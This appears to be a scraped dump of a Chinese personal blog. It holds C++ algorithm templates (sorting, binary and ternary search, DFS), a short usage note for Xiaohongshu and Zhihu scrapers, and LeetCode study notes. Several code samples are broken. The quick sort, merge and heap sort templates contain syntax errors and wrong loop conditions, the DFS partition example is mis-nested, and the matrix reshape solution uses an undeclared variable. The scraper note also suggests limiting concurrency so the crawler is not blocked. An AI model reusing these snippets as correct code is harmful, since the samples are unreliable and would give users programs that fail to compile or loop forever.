a[5] = 1 cnt[1] = 3 b[3] = 1 cnt[1] = 2\ni = 4: a[4] = 2 cnt[2] = 5 b[5] = 2 cnt[2] = 4\n\u0026hellip;以此类推\n最终结果：b = [1, 1, 2, 2, 3]\nMSD基数排序 基于 k - 关键字元素的比较方法，可以想到：先比较所有元素的第 关键字，就可以确定出各元素大致的大小关系；然后对 具有相同第 关键字的元素，再比较它们的第 关键字……以此类推。\n1 2 3 void MSD_radix_sort(u32ptr first,u32ptr last){ } 通常而言，基数排序比基于比较的排序算法（比如快速排序）要快。但由于需要额外的内存空间，因此当内存空间稀缺时，原地置换算法（比如快速排序）或许是个更好的选择。\n快速排序 不稳定，平均 O(nlogn)，最坏 O(n²)\n分治思想\n将数列划分为两部分\n递归到两个子序列中分别进行快速排序\n不用合并，此时数列已经有序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 struct Range{ int start,end; Range(int s=0,int e=0){ start =s,end =e; } }; template \u0026lt;typename T\u0026gt; void quick_sort(T arr[],const int len){ if(len\u0026lt;=0) return; Range r[len];//使用数组模拟栈 int p=0; //栈顶指针 r[p++]=Range(0,len-1);//压入整个数组范围 while(p){//当栈不为空 Range range = r[--p];//弹出栈顶范围 if (range.start \u0026gt;= range.end) continue;//范围无效跳过 T mid = arr[range.end];//选择最右边的元素作为基准值 int left = range.start,right=range.end-1; //分区过程 while(left\u0026lt;right){ while(arr[left]\u0026lt;mid \u0026amp;\u0026amp; left\u0026lt;right) left++; while(arr[left])\u0026gt;=mid\u0026amp;\u0026amp;left\u0026lt;right) right--; std:swap(arr[left],arr[right]);//左边小就不交换，比较下一个，右边同理 } //处理基准值 if(arr[left]\u0026gt;=arr[range.end]) std::swap(arr[left],arr[range.end]); else left++; } r[p++]=Range(range.start,left-1); r[p++]=Range(left+1,range.end); } 选一个基值，一个左指针，一个右指针，左指针指到的数字比基准小就不处理，左指针右移动，否则交换后，左指针右移动，然后右指针，数字大不处理，小的话交换，左移，当左右指针相遇，取这个数和最右边的元素比较，再次重复\n归并排序 最优，平均，最坏情况下均为nlogn，空间复杂度为n\n比较两个数组每个元素（有序），把小的放入新数组，如果还有剩下没比较的全部放入（因为有序）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void merge(const int *a,size_t aLen,const int *b,size_t bLen,int *c){ size_t i=0,j=0,k=0; while(i\u0026lt;aLen \u0026amp;\u0026amp; bLen){ if(b[j]\u0026lt;a[i]){ c[k]=b[j]; ++j; }else{ c[k]=a[i]; ++i } ++k; } for(;i\u0026lt;aLen;++i,++k) c[k]=a[i]; for(;j\u0026lt;bLen;++j,++k) c[k]=b[j]; } 分治法实现归并排序 mid=（l+r）/2\n1 2 3 4 5 6 7 8 9 void merge_sort(int *a,int l,int r){ if(r-l\u0026lt;=1) return; int mid = l+((r-l)\u0026gt;\u0026gt;1);//每次都加总长度的1/2 merge_sort(a,l,mid),merge_sort(a,mid,r); //合并 int tmp[1024]={}; merge(a+l,a+mid,a+r,a+mid,tmp+l); for(int i=l;i\u0026lt;r;++i) a[i]=tmp[i]; } 堆排序 不稳定，时间复杂度nlogn\n1.建堆\n1 2 3 iParent(i)=(i-1)/2 iLeftChild(i)=2*i+1 iRightChild(i)=2*i+2 2.排序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 void sift_dowmn(int arr[],int start,int end){ int parent = start; int child =parent*2+1; while(child\u0026lt;=end){ //先比较两个子节点大小，选择最大的 if(child+1\u0026lt;=end\u0026amp;\u0026amp;arr[child]\u0026lt;arr[child+1]) child++; //如果父节点比子节点大，代表调整完毕，直接跳出函数 if(arr[parent]\u0026gt;=arr[child]) return; else{//否则交换父子内容，子节点在和孙节点比较 swap(arr[parrent],arr[child]); parent = child; child = parent*2+1; } } } void heap_sort(int arr[],int len){ //从最后一个节点的父节点开始 for(int i=(len-1-1)/2;i\u0026gt;=0;i++) sift_down(arr,i,len-1); for(int i = len-1;i\u0026gt;0;i--){ swap(arr[0],arr[i]); sift_down(arr,0,i-1); } } 桶排序 稳定，时间平均复杂度n+n*n/k+k,最坏n^2\n1.设定一个定量的数组当作空桶\n2.遍历，放入相应桶\n3.对非空桶内部排序\n4.把非空桶中的元素拿出\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 constexpr int N=100010; int n,w,a[N];//n是元素个数，w是值域范围，a是待排序数组 vector\u0026lt;int\u0026gt; bucket[N]; //排序函数 void insertion_sort(vector\u0026lt;int\u0026gt;\u0026amp;A){ for(int i=1;i\u0026lt;A.size();++i){ int key=A[i]; int j=i-1; //将比key大的元素后移 while(j\u0026gt;=0\u0026amp;\u0026amp;A[j]\u0026gt;key){ A[j+1]=A[j]; --j; } A[j+1]=key;//插入key } } void bucket_sort(){ //计算每个桶的大小 int bucket_size=w/n+1; //清空所有桶 for(int i=0;i\u0026lt;n;++i){ bucket[i].clear(); } //将元素分配到桶中 for(int i=1;i\u0026lt;=n;++i){ bucket[a[i]/bucket_size].push_back(a[i]); } //对每个桶排序合并结果 int p=0; for(int i=0;i\u0026lt;n;++i){ insertion_sort(bucket[i]); for(int j=0;j\u0026lt;bucket[i].size();++j){ a[++p]=bucket[i][j]; } } } 二分法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int binary_search(int start,int end,int key){ int ret =-1;//未搜索到数据返回-1下标 int mid; while(start\u0026lt;=end){ mid = start+((end-start)\u0026gt;\u0026gt;1);//直接取平均可能会溢出 if(arr[mid]\u0026lt;key) start = mid + 1; else if(arr[mid]\u0026gt;key) end = mid-1; else{ ret = mid; break; } } return ret; } 三分法 如果需要求出单峰函数的极值点\n1 2 3 4 5 6 7 8 9 while(r-l\u0026gt;eps){ mid = l+((r-l)\u0026gt;\u0026gt;1); lmid = mid-eps; rmid = mid+eps; if(f(lmid)\u0026lt;f(rmid)) r = mid; else l = mid; } DFS(图论) 用栈来实现\n时间复杂度位n+m,空间复杂度为n，n表示点数，m表示边数\n1 2 3 4 5 6 7 8 DFS(v) // v 可以是图中的一个顶点，也可以是抽象的概念，如 dp 状态等。 在 v 上打访问标记 for u in v 的相邻节点 if u 没有打过访问标记 then DFS(u) end end end 非递归版本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; adj;//邻接表 vector\u0026lt;bool\u0026gt; vis;//记录节点是否已经遍历 void dfs(int s){ stack\u0026lt;int\u0026gt; st; st.push(s); vis[s]=true; while(!st.empty()){ int u=st.top(); st.pop(); for(int v:adg[u]){ if(!vis[v]){ vis[v]=true; st.push(v); } } } } 递归实现\n1 2 3 4 5 6 7 8 vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; adj;//邻接表 vector\u0026lt;bool\u0026gt; vis;//记录节点是否已经遍历 void dfs(const int u){ vis[u]=true; for(int v:adj[u]) if(!vis[v]) dfs(v) } 例题：把正整数n分解成3个不同的正整数，排在后面的数必须大于等于前面的数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int m,arr[103];//m是划分的最大个数，arr[103]存储当前划分方案 void dfs(int n,int i,int a){//n是待划分的数，a是可以取到的最小值 if(n == 0){//划分完了，找到以恶搞完整的划分方案，遍历打印 for(int j=1;j\u0026lt;=i-1;++j){ printf(\u0026#34;%d\u0026#34;,arr[j]); printf(\u0026#34;\\n\u0026#34;); } if(i\u0026lt;=m){ for(int j=a;j\u0026lt;=n;++j){//从a开始尝试每个可能的数 arr[i]=j;//记录当前选择 dfs(n-j,i+1,j);//递归处理剩余部分 } } } } ","date":"2025-03-25T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E5%B8%B8%E7%94%A8%E6%9D%BF%E5%AD%90/","title":"常用板子"},{"content":"小红书爬虫 1 python main.py --paltform xhs --lt qrcode --type search 修改了config下的配置文件，最好不要开并发，会发现爬了一段时间爬不了，修改keywords为实体清单，db_config为nkuwiki数据库配置，使用GET_IMAGES和GET_COMMENT，分两次爬取，一次导入数据库，一次导入本地以json格式，改START_DAY和END_DAY\n知乎爬虫 1 python main.py --platform zhihu --lt qrcode --type search 同上，图片和评论不开,可以并发爬取，最多爬取页数1000\nQA：如何处理数据，渲染s？\n泪了，utools下自己加了个脚本\n1 python utools/xhs_to_md.py 输出在docs/xhs下\n1 python scripts/zhihu_json_to_md.py 输出在data/zhihu/markdown下\n","date":"2025-03-23T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/nkuwiki%E7%88%AC%E8%99%AB%E8%AF%B4%E6%98%8E/","title":"NKUwiki爬虫说明"},{"content":"数组 二分法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution { public: int search(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) { int left = 0 ; int right =nums.size()-1; while (left \u0026lt;= right ){ int middle = left + ((right-left)/2); if (target \u0026lt; nums[middle]){ right = middle-1; } else if (target \u0026gt; nums[middle]){ left = middle+1; }else{ return middle; } } return -1; } }; 翻转链表\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 class Solution { public: ListNode* reverseList(ListNode* head) { ListNode* temp; ListNode* cur = head; ListNode* pre = NULL; while(cur){ temp=cur-\u0026gt;next;//暂时保存cur的下一个节点 cur-\u0026gt;next=pre;//反转 pre=cur;//更新pre和cur指针 cur=temp; } return pre; } }; 环形链表\n先找环形链表相遇点\n从头结点出发一个指针，从相遇节点 也出发一个指针，这两个指针每次只走一个节点， 那么当这两个指针相遇的时候就是 环形入口的节点。\n枚举 一个数组中的数互不相同，求其中和为 的数对的个数\n1 2 3 4 5 6 7 int ans = 0; for(int i=0;i\u0026lt;n;i++) for(int j=0;j\u0026lt;i;j++) if (a[i]+a[j]=0) ++ans; 优化后\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;cstring\u0026gt; constexpr int MAXN = 100000; //MAXN是数组内元素的界 int solve(int n,int a[]){ bool met[MAX*2+1];//创建一个能装下[-MAXN,MAXN]的桶 memset(met,0,sizeof(met)); int ans = 0; for(int i =0;i\u0026lt;n;++i){ if(met[MAXN-a[i]]) ++ans;//如果桶内有想要的元素，ans加一 met[MAXN+a[i]]=true;//把当前元素放入桶 } return ans; } 个人理解，一开始把桶初始化全部为false，第一个出现元素，ans还是为0，但是把这个元素放入桶内，比如假设 MAXN = 100000，数组 a[] = [1, -1, 2, -2, 3]，n = 5，遍历数组，a[0]=1,MAXN-1=99999，met[99999]为false,-1还没出现过，将met[MAXN+1]=met[100001]设为true,找第二个数a[1]=-1，met[MAXN-(-1)]=met[100001]为true，1已经出现过，ans++,然后将met[MAXN+(-1)]=met[99999]设置为TRUE\u0026hellip;\u0026hellip;时间复杂度为O(n)\n模拟 一只长度不计的蠕虫位于 英寸深的井的底部。它每次向上爬 英寸，但是必须休息一次才能再次向上爬。在休息的时候，它滑落了 英寸。之后它将重复向上爬和休息的过程。蠕虫爬出井口需要至少爬多少次？如果蠕虫爬完后刚好到达井的顶部，我们也设作蠕虫已经爬出井口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;iostream\u0026gt; int main(){ int n ,u,d; std::cin\u0026gt;\u0026gt;u\u0026gt;\u0026gt;d\u0026gt;\u0026gt;n; int dist,chance = 0; while(1){ dist+=u; chance++; if(dist\u0026gt;=n)break; dist -= d; } std::cout \u0026lt;\u0026lt; chance \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return 0; } 递归\u0026amp;分治 在函数中调用自身\n结束条件 自我调用 1 2 3 4 5 6 7 8 9 int size(Node *head){ int size=0; for(Node *p=head;p !=nullptr;p=p-\u0026gt;next) size--; return size; } int size_recursion(Node *head){ if(head == nullptr) return 0; return size_recursion(head-\u0026gt;next)+1; } 给定一个二叉树，它的每个结点都存放着一个整数值。\n找出路径和等于给定数值的路径总数。\n路径不需要从根节点开始，也不需要在叶子节点结束，但是路径方向必须是向下的（只能从父节点到子节点）。\n二叉树不超过 1000 个节点，且节点数值范围是 [-1000000,1000000] 的整数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 struct TreeNode{ int val; TreeNode *left; TreeNode *right; TreeNode(int x ):val(x),left(nullptr),right(nullptr); } int count (TreeNode *node ,int sum){ if (node ==nullptr) return 0; return (node -\u0026gt; val == sum)+ count(node-\u0026gt;left,sum=node-\u0026gt;val)+count(node-\u0026gt;right,sum-node-\u0026gt;val); } int pathSum(TreeNode *root,int sum){ if(root == nullptr)return 0 ; return count(root,sum)+pathSum(root-\u0026gt;left,sum)+pathSum(root-\u0026gt;right,sum); } pathSum函数，二叉树的遍历框架，分别对左右左子树递归调用函数本省\ncount函数每个节点和子树\n贪心算法 排序解法 恰逢 H 国国庆，国王邀请 n 位大臣来玩一个有奖游戏。首先，他让每个大臣在左、右手上面分别写下一个整数，国王自己也在左、右手上各写一个整数。然后，让这 n 位大臣排成一排，国王站在队伍的最前面。排好队后，所有的大臣都会获得国王奖赏的若干金币，每位大臣获得的金币数分别是：排在该大臣前面的所有人的左手上的数的乘积除以他自己右手上的数，然后向下取整得到的结果。\n国王不希望某一个大臣获得特别多的奖赏，所以他想请你帮他重新安排一下队伍的顺序，使得获得奖赏最多的大臣，所获奖赏尽可能的少。注意，国王的位置始终在队伍的最前面。\noperator\u0026lt;：比较当前对象*this和传入对象x\n1 2 3 4 5 6 7 struct uv{ int a,b; bool operator\u0026lt;(const uv \u0026amp;x) const{ return max(x.b,a*b)\u0026lt;max(b,x.a*x.b) } }; 后悔解法 字符串 反转字符串 1 2 3 4 5 6 7 8 class Solution { public: void reverseString(vector\u0026lt;char\u0026gt;\u0026amp; s) { for(int i =0,j=s.size()-1;i\u0026lt;s.size()/2;i++,j--){ swap(s[i],s[j]); } } }; swap的两种实现\n1 2 3 int tmp = s[i]; s[i]=s[j]; s[j]=tmp; 1 2 3 s[i]^=s[j]; s[j]^=s[i]; s[i]^=s[j]; 反转字符串2 给定一个字符串 s 和一个整数 k，从字符串开头算起, 每计数至 2k 个字符，就反转这 2k 个字符中的前 k 个字符。\n如果剩余字符少于 k 个，则将剩余字符全部反转。\n如果剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符，其余字符保持原样。\n示例:\n输入: s = \u0026ldquo;abcdefg\u0026rdquo;, k = 2 输出: \u0026ldquo;bacdfeg\u0026rdquo;\n1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution { public: string reverseStr(string s, int k) { for(int i =0;i\u0026lt;s.size();i+=(2*k)){ if(i+k\u0026lt;=s.size()){ reverse(s.begin()+i,s.begin()+i+k); }else{//剩余字符少于k个，则全部反转 reverse(s.begin()+i,s.end()); } } return s; } }; 注意for的构造\n翻转字符串的单词 去除多余空格 全部翻转 对于每个单词单独反转 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 class Solution { public: void reverse(string\u0026amp;s,int start,int end){ for(int i = start,j=end;i\u0026lt;j;i++,j--){ swap(s[i],s[j]); } } void removeExtraSpaces(string\u0026amp; s) { int slowIndex = 0, fastIndex = 0; // 定义快指针，慢指针 // 去掉字符串前面的空格 while (s.size() \u0026gt; 0 \u0026amp;\u0026amp; fastIndex \u0026lt; s.size() \u0026amp;\u0026amp; s[fastIndex] == \u0026#39; \u0026#39;) { fastIndex++; } for (; fastIndex \u0026lt; s.size(); fastIndex++) { // 去掉字符串中间部分的冗余空格 if (fastIndex - 1 \u0026gt; 0 \u0026amp;\u0026amp; s[fastIndex - 1] == s[fastIndex] \u0026amp;\u0026amp; s[fastIndex] == \u0026#39; \u0026#39;) { continue; } else { s[slowIndex++] = s[fastIndex]; } } if (slowIndex - 1 \u0026gt; 0 \u0026amp;\u0026amp; s[slowIndex - 1] == \u0026#39; \u0026#39;) { // 去掉字符串末尾的空格 s.resize(slowIndex - 1); } else { s.resize(slowIndex); // 重新设置字符串大小 } } string reverseWords(string s) { removeExtraSpaces(s);//去除多余空格，保证单词之间只有一个空格，且字符串首尾没空格 reverse(s,0,s.size()-1); int start=0; for(int i=0;i\u0026lt;=s.size();++i){ if(i==s.size()||s[i]==\u0026#39; \u0026#39;){//到达空格或者单词最后 reverse(s,start,i-1);//反转，注意是左闭右闭 start = i+1;//更新下一个单词的start } } return s; } }; 双指针解法，加深理解，快指针有试验的性质，如果有多个空格跳到最后一个空格让慢指针同步\n重复的子字符串 判断字符串s是否有重复字串，只要两个s拼接在一起，里面还出现一个s的话（掐头去尾避免找的是原先的s），就说明是由重复字串组成\n1 2 3 4 5 6 7 8 9 10 11 class Solution { public: bool repeatedSubstringPattern(string s) { string t =s+s; t.erase(t.begin()); t.erase(t.end()-1);//掐头去尾 if(t.find(s)!=std::string::npos) {return true; }else{return false;} } }; 哈希表 有效的字母异位词 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution { public: bool isAnagram(string s, string t) { int record[26]={0};//初始化为0 for(int i=0;i\u0026lt;s.size();i++){ record[s[i]-\u0026#39;a\u0026#39;]++; } for(int i = 0;i\u0026lt;t.size();i++){ record[t[i]-\u0026#39;a\u0026#39;]--; } for (int i=0;i\u0026lt;26;i++){ if (record[i]!=0){ return false; } } return true; } }; 如果两个单词是异位词的话，那么最终record元素应该全部都为0\n两个数组的交集 注意，使用数组来做哈希的题目，是因为题目限制了数值的大小，而这道题目没有限制数值的大小，就无法使用数组来做哈希表\nstd::set元素唯一且有序，不支持直接修改元素，必须先删除再插入 std::multiset元素可以重复且有序，不支持直接修改元素，必须先删除再插入 std::unordered_set元素唯一且无序，不支持直接修改元素，必须先删除再插入 std::set和std::multiset底层实现都是红黑树，std::unordered_set的底层实现是哈希表， 使用unordered_set 读写效率是最高的，并不需要对数据进行排序，而且还不要让数据重复，所以选择unordered_set。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution { public: vector\u0026lt;int\u0026gt; intersection(vector\u0026lt;int\u0026gt;\u0026amp; nums1, vector\u0026lt;int\u0026gt;\u0026amp; nums2) { unordered_set\u0026lt;int\u0026gt; result_set;//存放结果 int hash[1005]={0}; for(int num:nums1){//每次循环nums1的值都会赋给num hash[num]=1; } for (int num:nums2){ if(hash[num]==1){ result_set.insert(num); } } return vector\u0026lt;int\u0026gt;(result_set.begin(),result_set.end()); } }; 很巧妙的解法，相当于hash是个映射表，先把nums1映射到hash表上，映射方式就是查找位置，在查询nums2元素在hash表上的位置，也是用同样的方式，有点像加密算法（只不过这个算法很简单）\n快乐数 编写一个算法来判断一个数 n 是不是快乐数。\n「快乐数」定义为：对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和，然后重复这个过程直到这个数变为 1，也可能是 无限循环 但始终变不到 1。如果 可以变为 1，那么这个数就是快乐数。\n如果 n 是快乐数就返回 True ；不是，则返回 False 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 class Solution { public: int getSum(int n) {//计算各位数的平方和 int sum=0; while(n){ sum+=(n%10)*(n%10); n/=10; } return sum; } bool isHappy(int n){ unordered_set\u0026lt;int\u0026gt; set; while(1){ int sum = getSum(n); if(sum == 1){ return true; } if(set.find(sum)!=set.end()){//检查sum出现在容器中，如果sum曾经出现过，说明已经陷入了无线循环，立刻return false return false; }else{ set.insert(sum); } n=sum; } } }; 两数之和 给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。\n你可以假设每种输入只会对应一个答案。但是，数组中同一个元素不能使用两遍。\n示例:\n给定 nums = [2, 7, 11, 15], target = 9\n因为 nums[0] + nums[1] = 2 + 7 = 9\n所以返回 [0, 1]\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution { public: vector\u0026lt;int\u0026gt; twoSum(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) { std::unordered_map \u0026lt;int,int\u0026gt; map; for(int i=0;i\u0026lt;nums.size();i++){ //寻找是否有匹配的key，auto用来自动匹配数值类型 auto iter = map.find(target-nums[i]); if(iter!=map.end()){//iter是否在容器中 return {iter -\u0026gt;second,i};//iter-\u0026gt;second 是匹配键对应的值（即之前存储的下标），返回两个下标 } map.insert(pair\u0026lt;int,int\u0026gt;(nums[i],i));//如果没找到匹配对，就把访问过的元素和下标加入到map中 } return{}; } }; QA1:为什么会想到用哈希表？\n判断元素是否存在\nQA2:哈希表为什么用map？\n个人认为map有点像python里面的字典，可以查询键值对。\n数组的大小是受限制的，而且如果元素很少，而哈希值太大会造成内存空间的浪费。 set是一个集合，里面放的元素只能是一个key，而两数之和这道题目，不仅要判断y是否存在而且还要记录y的下标位置，因为要返回x 和 y的下标。所以set 也不能用。 此时就要选择另一种数据结构：map ，map是一种key value的存储结构，可以用key保存数值，用value再保存数值所在的下标。不需要key有序，选择std:unordered_map效率更高\nQA3：本题的map是用来存什么的？\n存放访问过的元素\nQA4：map中的key和value用来存什么？\nkey：数组元素，value：数组元素下标\n赎金信 给定一个赎金信 (ransom) 字符串和一个杂志(magazine)字符串，判断第一个字符串 ransom 能不能由第二个字符串 magazines 里面的字符构成。如果可以构成，返回 true ；否则返回 false。\n(题目说明：为了不暴露赎金信字迹，要从杂志上搜索各个需要的字母，组成单词来表达意思。杂志字符串中的每个字符只能在赎金信字符串中使用一次。)\n注意：\n你可以假设两个字符串均只含有小写字母。\ncanConstruct(\u0026ldquo;a\u0026rdquo;, \u0026ldquo;b\u0026rdquo;) -\u0026gt; false canConstruct(\u0026ldquo;aa\u0026rdquo;, \u0026ldquo;ab\u0026rdquo;) -\u0026gt; false canConstruct(\u0026ldquo;aa\u0026rdquo;, \u0026ldquo;aab\u0026rdquo;) -\u0026gt; true\n发一：暴力破解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution { public: bool canConstruct(string ransomNote, string magazine) { for (int i = 0; i \u0026lt; magazine.length(); i++) { for (int j = 0; j \u0026lt; ransomNote.length(); j++) { if (magazine[i] == ransomNote[j]) { ransomNote.erase(ransomNote.begin() + j); break; } } } if (ransomNote.length() == 0) { return true; } return false; } }; 遇到相同的字符，就把ransomNote中的字符删除，如果最后ransomNote为0，则返回true\n法二：哈希表\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 class Solution { public: bool canConstruct(string ransomNote, string magazine) { int record[26] = {0}; //add if (ransomNote.size() \u0026gt; magazine.size()) { return false; } for (int i = 0; i \u0026lt; magazine.length(); i++) { // 通过record数据记录 magazine里各个字符出现次数 record[magazine[i]-\u0026#39;a\u0026#39;] ++; } for (int j = 0; j \u0026lt; ransomNote.length(); j++) { // 遍历ransomNote，在record里对应的字符个数做--操作 record[ransomNote[j]-\u0026#39;a\u0026#39;]--; // 如果小于零说明ransomNote里出现的字符，magazine没有 if(record[ransomNote[j]-\u0026#39;a\u0026#39;] \u0026lt; 0) { return false; } } return true; } }; QA：为什么用数组而不是map？\nmap要维护红黑树或哈希表，空间消耗更大\n栈与队列 用栈实现队列 要有两个栈，一个In，一个Out，终点删除元素，先把In栈里面的push到Out栈中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 class MyQueue { public: stack\u0026lt;int\u0026gt; stIn; stack\u0026lt;int\u0026gt; stOut; MyQueue() { } void push(int x) { stIn.push(x); } int pop() {//将队列的第一个元素移除，并且返回这个元素 if(stOut.empty()){ while(!stIn.empty()){ stOut.push(stIn.top()); stIn.pop(); } } int result = stOut.top(); stOut.pop(); return result; } int peek() {//get the front element int res = this-\u0026gt;pop();//对当前对象调用pop() stOut.push(res);//pop()弹出了元素res，现在再添加回去，不改变 return res; } bool empty() { return stIn.empty()\u0026amp;\u0026amp;stOut.empty(); } }; 用队列实现栈 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 class MyStack { public: queue\u0026lt;int\u0026gt; que1; queue\u0026lt;int\u0026gt; que2; MyStack() { } void push(int x) { que1.push(x); } int pop() { int size = que1.size(); size--; while(size--){//将que1导入que2，但要留下最后一个元素 que2.push(que1.front()); que1.pop(); } int result = que1.front();//留下的最后一个元素就是要返回的值 que1.pop(); que1 = que2; while(!que2.empty()){//清空que2，que2相当于一个工具了 que2.pop(); } return result; } int top() { int size = que1.size(); size--; while(size--){//将que1导入que2，但要留下最后一个元素 que2.push(que1.front()); que1.pop(); } int result = que1.front(); que2.push(que1.front());//获取值后将最后一个元素也加入que2中，保持原本的结构不变 que1.pop(); que1=que2; while(!que2.empty()){ que2.pop(); } return result; } bool empty() { return que1.empty(); } }; 总的思想就是把que1导入que2，但要留下一个元素，存储这个元素，然后对这个元素操作/不操作，恢复原来的队列，que2相当于一个桥梁工具\n匹配括号 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Solution { public: bool isValid(string s) { if(s.size()%2!=0)return false;//如果长度为奇数，一定不符合要求 stack\u0026lt;char\u0026gt; st; for(int i = 0;i\u0026lt;s.size();i++){ if(s[i]==\u0026#39;(\u0026#39;) st.push(\u0026#39;)\u0026#39;); else if(s[i]==\u0026#39;{\u0026#39;) st.push(\u0026#39;}\u0026#39;); else if (s[i]==\u0026#39;[\u0026#39;) st.push(\u0026#39;]\u0026#39;); //遍历左括号，检查st else if (st.empty()|| st.top()!=s[i]) return false;//如果还在遍历，st已经为空，或者遍历找不到不匹配 else st.pop();//st.top()与s[i]相等，栈弹出元素 } return st.empty(); } }; 经典题了，s有做左括号就放入st相应的右括号，s有右括号就检查st中有无一样的右括号\n逆波兰表达式求值 展示了计算机如何思考，如果是中缀表达式，计算机得先从左到右遍历一遍再按回过头来优先级，如 ( 1 + 2 ) * ( 3 + 4 ) ，但如果是后缀表达式加不加括号无所谓因为顺序就是从左往右，如 ( ( 1 2 + ) ( 3 4 + ) * )\n思考：把tokens里面的数字入栈，遇到运算符不入栈，把栈里面的两个数字取出来，反过来做运算，再把这个数字入栈\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class Solution { public: int evalRPN(vector\u0026lt;string\u0026gt;\u0026amp; tokens) { stack\u0026lt;long long\u0026gt; st; for(int i=0;i\u0026lt;tokens.size();i++){ if(tokens[i]==\u0026#34;+\u0026#34;||tokens[i]==\u0026#34;-\u0026#34;||tokens[i]==\u0026#34;*\u0026#34;||tokens[i]==\u0026#34;/\u0026#34;){ long long num1 = st.top(); st.pop(); long long num2 = st.top(); st.pop(); if(tokens[i]==\u0026#34;+\u0026#34;) st.push(num2+num1); if(tokens[i]==\u0026#34;-\u0026#34;) st.push(num2-num1); if(tokens[i]==\u0026#34;*\u0026#34;) st.push(num2*num1); if(tokens[i]==\u0026#34;/\u0026#34;) st.push(num2/num1); }else{ st.push(stoll(tokens[i]));//stoll()将函数转换成long long int } } auto result = st.top(); return result; } }; 二叉树 1 2 3 4 5 6 struct TreeNode { int val; TreeNode *left; TreeNode *right; TreeNode(int x):val(x),left(NULL),right(NULL){} } 递归遍历 前序：中左右\n中序：左中右\n后序：左右中\n二叉树的直径 给你一棵二叉树的根节点，返回该树的 直径 。\n二叉树的 直径 是指树中任意两个节点之间最长路径的 长度 。这条路径可能经过也可能不经过根节点 root 。\n两节点之间路径的 长度 由它们之间边数表示。\n思路：一个节点为起点的经过节点数的最大值为dn，那么二叉树的直径就是所有节点dn的最大值减一\n子树深度为max(L,R)\ndn为L+R+1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution { int ans; int depth(TreeNode* rt){ if(rt == NULL){ return 0; } int L=depth(rt-\u0026gt;left);//左儿子为根的子树的深度 int R=depth(rt-\u0026gt;right);//右二子为根的子树的深度 ans = max(ans,L+R+1);//更新计算ans return max(L,R)+1;//返回该节点为根的子树的深度 } public: int diameterOfBinaryTree(TreeNode* root) { ans =1; depth(root); return ans-1; } }; 翻转二叉树 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution { public: TreeNode* invertTree(TreeNode* root) { if(root == NULL){ return 0; } TreeNode* L = invertTree(root-\u0026gt;left); TreeNode* R = invertTree(root-\u0026gt;right); root-\u0026gt;left = R; root-\u0026gt;right = L; return root; } }; 数组与矩阵 重塑矩阵 在 MATLAB 中，有一个非常有用的函数 reshape ，它可以将一个 m x n 矩阵重塑为另一个大小不同（r x c）的新矩阵，但保留其原始数据。\n思路：把二维数组m*n的nums映射成一个一维数组。将这个以为数组映射回r行c列\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; matrixReshape(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; mat, int r, int c) { int m = nums.size(); int n =nums[0].size(); if(m*n!=r*c) { return nums; } vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; ans(r,vector\u0026lt;int\u0026gt;(c)); for(int x=0;x\u0026lt;m*n;++x){ ans[x/c][x%c]=nums[x/n][x%n]; } return ans; }; 第 x 个元素在 nums 中对应的下标为 (x / n,x % n)，而在新的重塑矩阵中对应的下标为 (x / c,x % c)。我们直接进行赋值即可。\n搜索二维矩阵 编写一个高效的算法来搜索 *m* x *n* 矩阵 matrix 中的一个目标值 target 。该矩阵具有以下特性：\n每行的元素从左到右升序排列。 每列的元素从上到下升序排列。 暴力搜索\n1 2 3 4 